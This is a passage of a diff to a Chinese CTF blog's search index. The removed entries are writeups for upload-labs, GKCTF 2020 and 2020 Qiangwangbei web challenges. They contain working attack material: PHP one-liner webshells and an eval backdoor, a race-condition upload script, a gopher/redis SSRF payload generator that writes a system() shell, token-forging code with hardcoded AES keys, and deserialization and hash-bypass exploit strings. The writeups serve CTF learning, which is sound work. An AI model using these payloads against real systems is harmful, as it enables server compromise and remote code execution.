-<p>这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromgif-pass-00.gif" target="_blank" rel="noopener">示例</a>。</p>
-<p>打开被渲染后的图片，Webshell代码仍然存在。</p>
-<p>提供一个jpg格式图片绕过imagecreatefromjpeg函数渲染的一个<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromjpeg-pass-LandGrey.jpg" target="_blank" rel="noopener">示例文件</a>。 直接上传示例文件会触发Warning警告，并提示文件不是jpg格式的图片。但是实际上已经上传成功，而且示例文件名没有改变。</p>
-<p>从上面上传jpg图片可以看到我们想复杂了，程序没有对渲染异常进行处理，直接在正常png图片内插入webshell代码，然后上传<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefrompng-pass-LandGrey.png" target="_blank" rel="noopener">示例文件</a>即可，并不需要图片是正常的图片。</p>
-<p>程序依然没有对文件重命名，携带webshell的无效损坏png图片直接被上传成功。</p>
-<h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>条件竞争</p>
-<pre><code class="python">#!/usr/bin/env python
-# coding:utf-8
-# Build By LandGrey
-
-import hackhttp
-from multiprocessing.dummy import Pool as ThreadPool
-
-
-def upload(lists):
-    hh = hackhttp.hackhttp()
-    raw = &quot;&quot;&quot;POST /upload-labs/Pass-17/index.php HTTP/1.1
-Host: localhost:8089
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Referer: http://localhost:8089/upload-labs/Pass-17/index.php
-Content-Type: multipart/form-data; boundary=---------------------------287032381131322
-Content-Length: 334
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-
------------------------------287032381131322
-Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php&quot;
-Content-Type: application/octet-stream
-
-&lt;?php
- phpinfo();
- ?&gt;
------------------------------287032381131322
-Content-Disposition: form-data; name=&quot;submit&quot;
-
-ä¸ä¼ 
------------------------------287032381131322--
-&quot;&quot;&quot;
-    code, head, html, redirect, log = hh.http(&#39;http://localhost:8089/upload-labs/Pass-17/index.php&#39;, raw=raw)
-    print(str(code) + &quot;\r&quot;)
-
-
-pool = ThreadPool(10)
-pool.map(upload, range(10000))
-pool.close()
-pool.join()</code></pre>
-]]></content>
-      <tags>
-        <tag>PRACTICE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2020-GKCTF-WEB</title>
-    <url>/2020/05/28/2020-GKCTF-Web/</url>
-    <content><![CDATA[<p>找了个时间复现了 GKCTF 的 WEB 题目</p>
-<a id="more"></a>
-
-<h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><p><strong>代码执行</strong></p>
-<p>进去给到源码，给了我们一个小马</p>
-<pre><code class="php">&lt;?php 
-highlight_file(__FILE__);
-class ClassName
-{
-        public $code = null;
-        public $decode = null;
-        function __construct()
-        {
-                $this-&gt;code = @$this-&gt;x()[&#39;Ginkgo&#39;];
-                $this-&gt;decode = @base64_decode( $this-&gt;code );
-                @Eval($this-&gt;decode);
-        }
-
-        public function x()
-        {
-                return $_REQUEST;
-        }
-}
-new ClassName();</code></pre>
-<p>先上一个小马</p>
-<pre><code class="php">php &gt; echo base64_encode(&#39;eval($_REQUEST[kk]);&#39;);
-ZXZhbCgkX1JFUVVFU1Rba2tdKTs=</code></pre>
-<p>看看 phpinfo</p>
-<pre><code>?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=phpinfo();</code></pre><p>绕 disable_functions</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113759.png" alt="image-20200528103728833"></p>
-<p>蚁剑连上去，flag 需要 /readflag</p>
-<p>可以直接用这个绕  <a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p>
-<p>上传到 /tmp 目录，直接包含就好</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113803.png" alt></p>
-<p>执行命令</p>
-<pre><code>?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=include(&quot;/tmp/exploit.php&quot;);&amp;cmd=/readflag</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113808.png" alt="image-20200528105315601"></p>
-<h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><p><strong>cve-2020-7066</strong></p>
-<p>exp 在这里 <a href="https://bugs.php.net/bug.php?id=79329" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=79329</a></p>
-<p>直接打就好，访问 127.0.0.1 返回 hint</p>
-<pre><code>?url=http://127.0.0.1%00.ctfhub.com</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164116.png" alt="image-20200528110116218"></p>
-<pre><code>?url=http://127.0.0.123%00.ctfhub.com</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164121.png" alt="image-20200528110131001"></p>
-<h2 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h2><p><strong>弱口令+后台geishell+提权</strong></p>
-<p>参考 <a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">http://www.nctry.com/1660.html</a> 后台getshell</p>
-<p>我这里扔了一个冰蝎的马，连上读 /flag</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164128.png" alt="image-20200528110926892"></p>
-<p>读了个寂寞，提示日期很重要</p>
-<p>上传个 <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a> 读一下信息</p>
-<p>在进程信息那里我们看到了 root 在执行一个 /auto.sh</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164131.png" alt="image-20200528112105303"></p>
-<p>看一下文件，这也是解释了进程为什么一直有 sleep 60 这个操作</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164137.png" alt="image-20200528112206309"></p>
-<p>看一下 py 文件</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164139.png" alt="image-20200528112300934"></p>
-<p>这很显然就是我们的变量劫持，看一下权限</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113824.png" alt="image-20200528112351256"></p>
-<p>所以我们可以通过改写这个 py 文件提权</p>
-<p>其实，这个 /auto.sh 也是可写的，我们也可以改这个</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113826.png" alt="image-20200528112456969"></p>
-<p>我这里就直接改 py 了</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113829.png" alt="image-20200528113533012"></p>
-<p>等个一分钟收割 flag</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113831.png" alt="image-20200528113511733"></p>
-<h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><p><strong>内网+redis写shell</strong></p>
-<p>进去源码有提示</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113834.png" alt="image-20200528113752714"></p>
-<p>给到了一个 hosts 的信息</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113906.png" alt="image-20200528113904509"></p>
-<p>尝试访问 localhost 被 waf</p>
-<pre><code>/index.php?url=http://127.0.0.1&amp;submit=提交</code></pre><p>那就改成内网地址试试</p>
-<pre><code>/index.php?url=http://173.235.100.10&amp;submit=提交</code></pre><p>返回了正常页面</p>
-<p>这里我们揣测出题人的思路，那应该就是让我扫内网地址，直接 bp，发现了这个比较特殊</p>
-<pre><code>/index.php?url=http://173.235.100.11&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114349.png" alt="image-20200528114209680"></p>
-<p>那就是让我们去扫描端口，继续 bp 扫常用端口，发现 redis 有回显</p>
-<blockquote>
-<p>记住要扫常用服务，不要从1开始扫，不然要很久</p>
-</blockquote>
-<pre><code>/index.php?url=http://173.235.100.11:6379&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114356.png" alt="image-20200528114347813"></p>
-<p>gopher 协议没有 ban，发现可以 redis 随意写 shell</p>
-<blockquote>
-<p>注意编码问题就好</p>
-</blockquote>
-<p>这里直接贴上 payload</p>
-<pre><code class="python">import urllib
-import requests as rq
-
-protocol=&quot;gopher://&quot;
-ip=&quot;173.19.221.11&quot;
-port=&quot;6379&quot;
-shell=&quot;\n\n\n\n&lt;?php system(&#39;ls / -al&#39;);system(&#39;cat /flag&#39;); ?&gt;\n\n\n\n&quot;
-filename=&quot;index.php&quot;
-path=&quot;/var/www/html&quot;
-passwd=&quot;&quot;
-cmd=[&quot;flushall&quot;,
-     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
-     &quot;config set dir {}&quot;.format(path),
-     &quot;config set dbfilename {}&quot;.format(filename),
-     &quot;save&quot;,
-     &quot;quit&quot;
-     ]
-if passwd:
-    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
-payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
-def redis_format(arr):
-    CRLF=&quot;\r\n&quot;
-    redis_arr = arr.split(&quot; &quot;)
-    cmd=&quot;&quot;
-    cmd+=&quot;*&quot;+str(len(redis_arr))
-    for x in redis_arr:
-        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
-    cmd+=CRLF
-    return cmd
-
-if __name__==&quot;__main__&quot;:
-    for x in cmd:
-        payload += redis_format(x).replace(&quot;\r\n&quot;,&quot;%250D%250A&quot;).replace(&quot;\n&quot;,&quot;%250A&quot;).replace(&quot;?&quot;,&quot;%253f&quot;)
-    print(payload)</code></pre>
-<blockquote>
-<p>这里我省了步骤，我是先看了 phpinfo()，发现没有 ban system()，再列一个目录，再看 flag 在哪</p>
-</blockquote>
-<p>上传之后回显成功</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114937.png" alt="image-20200528114934084"></p>
-<p>访问内网机子就能看到</p>
-<pre><code>/index.php?url=http://173.235.100.11&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528115043.png" alt="image-20200528115041491"></p>
-<h2 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h2><p><strong>nodejs</strong></p>
-<p>上来给了代码和版本，直接代码审计</p>
-<p>总体逻辑就是绕过这里的 waf</p>
-<pre><code class="js">app.use((req, res, next) =&gt; {
-  if (req.path === &#39;/eval&#39;) {
-    let delay = 60 * 1000;
-    console.log(delay);
-    if (Number.isInteger(parseInt(req.query.delay))) {
-      delay = Math.max(delay, parseInt(req.query.delay));
-    }
-    const t = setTimeout(() =&gt; next(), delay);
-    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
-    setTimeout(() =&gt; {
-      clearTimeout(t);
-      console.log(&#39;timeout&#39;);
-      try {
-        res.send(&#39;Timeout!&#39;);
-      } catch (e) {
-
-      }
-    }, 1000);
-  } else {
-    next();
-  }
-});</code></pre>
-<p>就可以直接 eval 了</p>
-<pre><code class="js">app.post(&#39;/eval&#39;, function (req, res) {
-  let response = &#39;&#39;;
-  if (req.body.e) {
-    try {
-      response = saferEval(req.body.e);
-    } catch (e) {
-      response = &#39;Wrong Wrong Wrong!!!!&#39;;
-    }
-  }
-  res.send(String(response));
-});</code></pre>
-<p>waf 可以用 int 溢出漏洞绕过，所以传入 2147483648 绕过成功</p>
-<blockquote>
-<p>当 delay 大于 2147483647 或小于 1 时,延迟将设置为 1</p>
-</blockquote>
-<p>后面就是绕 saferEval 了，这个根据版本去搜一下就好 ，最新版本的一般在 github 的 issues 里找到，可以直接拿来用</p>
-<p><a href="https://github.com/commenthol/safer-eval/issues/11" target="_blank" rel="noopener">https://github.com/commenthol/safer-eval/issues/11</a></p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528120421.png" alt="image-20200528120418230"></p>
-<h2 id="GKCTF2020-EZ三剑客-EzTypecho"><a href="#GKCTF2020-EZ三剑客-EzTypecho" class="headerlink" title="[GKCTF2020]EZ三剑客-EzTypecho"></a>[GKCTF2020]EZ三剑客-EzTypecho</h2><p><strong>反序列化</strong></p>
-<p><a href="https://www.kingkk.com/2018/07/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">Typecho反序列化漏洞复现</a></p>
-<p>原版本在 install.php 那会有一个反序列化</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121417.png" alt="image-20200528121416697"></p>
-<p>但是出题人在这里加多了一个 <code>if(!isset($_SESSION))</code></p>
-<p>但是后面还有一处，我们直接传入 <code>?start</code> 触发即可</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121358.png" alt="image-20200528121355676"></p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121956.png" alt="image-20200528121820549"></p>
-<p>命令执行无限制，直接读 /flag 就好</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528122002.png" alt="image-20200528121954615"></p>
-<h2 id="GKCTF2020-Node-Exe"><a href="#GKCTF2020-Node-Exe" class="headerlink" title="[GKCTF2020]Node-Exe"></a>[GKCTF2020]Node-Exe</h2><p>第一次碰到这题目，无从下手，不过还挺有意思的</p>
-<p>先看一下程序运行逻辑，打开 admin 登陆进去，然后给你三个 flag，打开 fiddler 抓包发现是发送了一个含有 timestamp 的 json，id 对应的就是 flag 的位置</p>
-<blockquote>
-<p>命令行断点 bpu <a href="http://xxx.node3.buuoj.cn" target="_blank" rel="noopener">http://xxx.node3.buuoj.cn</a></p>
-</blockquote>
-<pre><code>{&quot;id&quot;:1,&quot;timestamp&quot;:1590639747000}</code></pre><p>直接修改 id = 3 会返回</p>
-<pre><code>{&quot;message&quot;:&quot;HaHa Hacker!!!&quot;}</code></pre><p>写脚本伪造 timestamp 也失败</p>
-<p>所以后台应该是验证了 token</p>
-<p>还是去看看源码吧，把安装程序改成 zip 解压一下，源码在 </p>
-<pre><code>/app-64/resources/app.asar</code></pre><p>进行反编译</p>
-<pre><code>npm install -g asar
-asar extract app.asar app</code></pre><p>看一下 buyflag 的逻辑</p>
-<pre><code class="js">buyFlag: function(e) {
-    var i = this;
-    return c()(a.a.mark((function t() {
-        var o;
-        return a.a.wrap((function(t) {
-            for (;;) switch (t.prev = t.next) {
-            case 0:
-                return o = {
-                    id: e,
-                    timestamp: Date.parse(new Date)
-                },
-                t.t0 = i.$http,
-                t.t1 = i.url + &quot;/buyflag&quot;,
-                t.t2 = o,
-                t.next = 6,
-                i.makeToken(o);
-            case 6:
-                t.t3 = t.sent,
-                t.t4 = {
-                    token: t.t3
-                },
-                t.t5 = {
-                    headers: t.t4
-                },
-                t.t6 = function(e) {
-                    i.$Modal.info({
-                        title: &quot;购买结果&quot;,
-                        content: e.data[0].flag
-                    })
-                },
-                t.t0.post.call(t.t0, t.t1, t.t2, t.t5).then(t.t6);
-            case 11:
-            case &quot;end&quot;:
-                return t.stop()
-            }
-        }), t, i)
-    })))()
-}</code></pre>
-<p>看一下 makeToken</p>
-<pre><code class="js">makeToken: function(e) {
-    var i = this;
-    return c()(a.a.mark((function t() {
-        var o, r;
-        return a.a.wrap((function(t) {
-            for (;;) switch (t.prev = t.next) {
-            case 0:
-                return &quot;31169fedc9a20ecf&quot;,
-                &quot;d96adeefaa0102a9&quot;,
-                o = f()(n()(e)),
-                t.next = 5,
-                i.encrypt(&quot;31169fedc9a20ecf&quot;, &quot;d96adeefaa0102a9&quot;, o);
-            case 5:
-                return r = t.sent,
-                t.abrupt(&quot;return&quot;, r);
-            case 7:
-            case &quot;end&quot;:
-                return t.stop()
-            }
-        }), t, i)
-    })))()
-}</code></pre>
-<p>再看一下 encrypt</p>
-<pre><code class="js">encrypt: function(e, i, t) {
-    var o = this;
-    return c()(a.a.mark((function n() {
-        return a.a.wrap((function(o) {
-            for (;;) switch (o.prev = o.next) {
-            case 0:
-                return o.abrupt(&quot;return&quot;, new s.a((function(o) {
-                    var n = p.a.createCipheriv(&quot;aes-128-cbc&quot;, e, i),
-                    r = n.update(t, &quot;utf8&quot;, &quot;binary&quot;);
-                    r += n.final(&quot;binary&quot;),
-                    o(r = new Buffer.from(r, &quot;binary&quot;).toString(&quot;hex&quot;))
-                })));
-            case 1:
-            case &quot;end&quot;:
-                return o.stop()
-            }
-        }), n, o)
-    })))()
-},</code></pre>
-<p>所以 token 使用了 <code>aes-128-cbc</code> 进行对经过了 <code>o=f()(n()(e))</code> 处理的 json 进行加密，key 是 <code>31169fedc9a20ecf</code>，iv 是 <code>d96adeefaa0102a9</code></p>
-<p>随便拿一个 token 试验一下</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164157.png" alt="image-20200528150727592"></p>
-<p>32 位的我们拿 md5 测试一下</p>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164154.png" alt="image-20200528150920692"></p>
-<p>可以看到是吻合的，这里贴上脚本</p>
-<pre><code class="python"># coding:utf-8
-from Crypto.Cipher import AES
-from binascii import b2a_hex, a2b_hex
-import time, json, datetime, hashlib
-import requests as rq
-
-def encrypt(raw):
-    BS = 16
-    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
-    key = b&#39;31169fedc9a20ecf&#39;
-    iv = b&#39;d96adeefaa0102a9&#39;
-    raw = pad(raw).encode()
-    cryptor = AES.new(key, AES.MODE_CBC, iv)
-    ciphertext = cryptor.encrypt(raw)
-    return b2a_hex(ciphertext).decode()
-
-def get_data_token():
-    dtime = datetime.datetime.now()
-    t = int(time.mktime(dtime.timetuple())) * 1000
-    data = json.dumps({&quot;id&quot;:&quot;3||1&quot;, &quot;timestamp&quot;:t}).replace(&#39; &#39;,&#39;&#39;)
-    print(&quot;[+] data：%s&quot; % data)
-    token = encrypt(hashlib.md5(data.encode()).hexdigest())
-    print(&quot;[+] token：%s&quot; % token)
-    headers = {
-        &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;,
-        &quot;token&quot;:token
-    }
-    return data, headers
-
-if __name__== &quot;__main__&quot;:
-    url = &quot;http://1165bc7f-ecfb-45e8-bbc5-533876f73e8d.node3.buuoj.cn/buyflag&quot;
-    data, headers = get_data_token()
-    res = rq.post(url, data=data, headers=headers)
-    print(res.text)
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164148.png" alt="image-20200528162837226"></p>
-<blockquote>
-<p>需要注意的是</p>
-<ol>
-<li>使用 json.dumps 要把结果的空格都去掉</li>
-<li>AES 加密使用的 padding 是 pkcs5</li>
-<li>时间戳的获取一定要用 datetime()，不能用直接 time.time() </li>
-</ol>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1447,370 +897,6 @@ for i in dir(posix):
       </tags>
   </entry>
   <entry>
-    <title>2020 强网杯 web</title>
-    <url>/2020/08/29/2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-web/</url>
-    <content><![CDATA[<p>强网杯的质量还是很高，只做出了一道web : )</p>
-<a id="more"></a>
-
-<h2 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h2><blockquote>
-<p>php反序列化字符串逃逸</p>
-</blockquote>
-<pre><code class="php">// common.php
-
-&lt;?php
-class player{
-    protected $user;
-    protected $pass;
-    protected $admin;
-
-    public function __construct($user, $pass, $admin = 0){
-        $this-&gt;user = $user;
-        $this-&gt;pass = $pass;
-        $this-&gt;admin = $admin;
-    }
-
-    public function get_admin(){
-        return $this-&gt;admin;
-    }
-}
-
-class topsolo{
-    protected $name;
-
-    public function __construct($name = &#39;Riven&#39;){
-        $this-&gt;name = $name;
-    }
-
-    public function TP(){
-        if (gettype($this-&gt;name) === &quot;function&quot; or gettype($this-&gt;name) === &quot;object&quot;){
-            $name = $this-&gt;name;
-            $name();
-        }
-    }
-
-    public function __destruct(){
-        $this-&gt;TP();
-    }
-
-}
-
-class midsolo{
-    protected $name;
-
-    public function __construct($name){
-        $this-&gt;name = $name;
-    }
-
-    public function __wakeup(){
-        if ($this-&gt;name !== &#39;Yasuo&#39;){
-            $this-&gt;name = &#39;Yasuo&#39;;
-            echo &quot;No Yasuo! No Soul!\n&quot;;
-        }
-    }
-
-
-    public function __invoke(){
-        $this-&gt;Gank();
-    }
-
-    public function Gank(){
-        if (stristr($this-&gt;name, &#39;Yasuo&#39;)){
-            echo &quot;Are you orphan?\n&quot;;
-        }
-        else{
-            echo &quot;Must Be Yasuo!\n&quot;;
-        }
-    }
-}
-
-class jungle{
-    protected $name = &quot;&quot;;
-
-    public function __construct($name = &quot;Lee Sin&quot;){
-        $this-&gt;name = $name;
-    }
-
-    public function KS(){
-        system(&quot;whoami&quot;);
-    }
-
-    public function __toString(){
-        $this-&gt;KS();  
-        return &quot;&quot;;  
-    }
-
-}
-?&gt;</code></pre>
-<pre><code class="php">// index.php
-
-&lt;?php
-@error_reporting(0);
-require_once &quot;common.php&quot;;
-require_once &quot;class.php&quot;;
-
-if (isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])){
-    $username = $_GET[&#39;username&#39;];
-    $password = $_GET[&#39;password&#39;];
-    $player = new player($username, $password);
-    file_put_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]), write(serialize($player))); 
-    echo sprintf(&#39;Welcome %s, your ip is %s\n&#39;, $username, $_SERVER[&#39;REMOTE_ADDR&#39;]);
-}
-else{
-    echo &quot;Please input the username or password!\n&quot;;
-}
-
-?&gt;
-</code></pre>
-<pre><code class="php">// common.php
-
-&lt;?php
-function read($data){
-    $data = str_replace(&#39;\0*\0&#39;, chr(0).&quot;*&quot;.chr(0), $data);
-    return $data;
-}
-function write($data){
-    $data = str_replace(chr(0).&quot;*&quot;.chr(0), &#39;\0*\0&#39;, $data);
-    return $data;
-}
-
-function check($data)
-{
-    if(stristr($data, &#39;name&#39;)!==False){
-        die(&quot;Name Pass\n&quot;);
-    }
-    else{
-        return $data;
-    }
-}
-?&gt;</code></pre>
-<pre><code class="php">// play.php
-
-&lt;?php
-@error_reporting(0);
-require_once &quot;common.php&quot;;
-require_once &quot;class.php&quot;;
-
-var_dump(read(check(file_get_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])))));
-
-@$player = unserialize(read(check(file_get_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])))));
-print_r($player);
-if ($player-&gt;get_admin() === 1){
-    echo &quot;FPX Champion\n&quot;;
-}
-else{
-    echo &quot;The Shy unstoppable\n&quot;;
-}
-
-?&gt;
-</code></pre>
-<p>先找出payload</p>
-<pre><code class="php">$a = new topsolo(new midsolo(new jungle(&#39;Tyao&#39;)));
-$b = new player(&#39;Tyao&#39;,$a,1);
-echo serialize($b);
-
-O:6:&quot;player&quot;:3:{s:7:&quot;*user&quot;;s:4:&quot;Tyao&quot;;s:7:&quot;*pass&quot;;O:7:&quot;topsolo&quot;:1:{s:7:&quot;*name&quot;;O:7:&quot;midsolo&quot;:1:{s:7:&quot;*name&quot;;O:6:&quot;jungle&quot;:1:{s:7:&quot;*name&quot;;s:4:&quot;Tyao&quot;;}}}s:8:&quot;*admin&quot;;i:1;}</code></pre>
-<p>利用字节流S绕过对name的检测</p>
-<pre><code class="php">O:6:&quot;player&quot;:3:{s:7:&quot;*user&quot;;s:4:&quot;Tyao&quot;;s:7:&quot;*pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;s:4:&quot;Tyao&quot;;}}}s:8:&quot;*admin&quot;;i:1;}</code></pre>
-<p>查看正常的序列化数据</p>
-<pre><code class="php">O:6:&quot;player&quot;:3:{s:7:&quot;*user&quot;;s:4:&quot;user&quot;;s:7:&quot;*pass&quot;;s:3:&quot;pwd&quot;;s:8:&quot;*admin&quot;;i:0;}</code></pre>
-<p>修改【pwd】的值使其和我们的payload匹配，顺便修改个长度</p>
-<pre><code class="php">O:6:&quot;player&quot;:3:{s:7:&quot;*user&quot;;s:4:&quot;user&quot;;s:7:&quot;*pass&quot;;s:154:&quot;
-
-;s:7:&quot;*pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;s:4:&quot;Tyao&quot;;}}}s:8:&quot;*admin&quot;;i:1;}
-
-&quot;;s:8:&quot;\0*\0admin&quot;;i:0;}</code></pre>
-<p>计算多出来的数据的长度</p>
-<pre><code class="python">len(&#39;&quot;;s:7:&quot;*pass&quot;;s:158:&#39;) == 22</code></pre>
-<blockquote>
-<p>%00*%00pass还有两个隐藏字符，下面的payload也不要忘记加上</p>
-</blockquote>
-<p>每次字符串逃逸可以多出2个字符，所以修改username为11个<code>\0*\0</code></p>
-<p>最终exp如下：</p>
-<pre><code class="php">username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0
-password=;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00n\61me&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00n\61me&quot;;s:0:&quot;&quot;;}}};s:8:&quot;*admin&quot;;i:1;}</code></pre>
-<h2 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h2><blockquote>
-<p>哈希tricks</p>
-</blockquote>
-<pre><code class="php">&lt;?php
-include &#39;conn.php&#39;;
-highlight_file(&quot;index.php&quot;);
-//level 1
-if ($_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;]))
-{
-    die(&#39;level 1 failed&#39;);
-}
-
-//level 2
-if($_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;]))
-{
-    die(&#39;level 2 failed&#39;);
-}
-
-//level 3
-$query = &quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;;
-$result = $mysqli-&gt;query($query);
-$row = $result-&gt;fetch_assoc(); 
-var_dump($row);
-$result-&gt;free();
-$mysqli-&gt;close();
-
-?&gt;</code></pre>
-<p>hash4强哈希碰撞，后面是凑出or 1，直接百度就行</p>
-<pre><code class="php">&lt;?php
-$int=1;
-$md4=&quot;&quot;;
-$name=&quot;0e&quot;;
-while ($md4!=$name){
-    $name=&#39;0e&#39;.$int;
-    $int++;
-    $md4=hash(&#39;md4&#39;,$name);
-}
-echo $name;</code></pre>
-<p>数组绕过hash比较，</p>
-<p>最终exp</p>
-<pre><code class="haskell">?hash1=0e251288019&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=ffifdyop</code></pre>
-<h2 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h2><blockquote>
-<p>命令执行</p>
-</blockquote>
-<pre><code class="php">&lt;?php
-highlight_file(&quot;index.php&quot;);
-
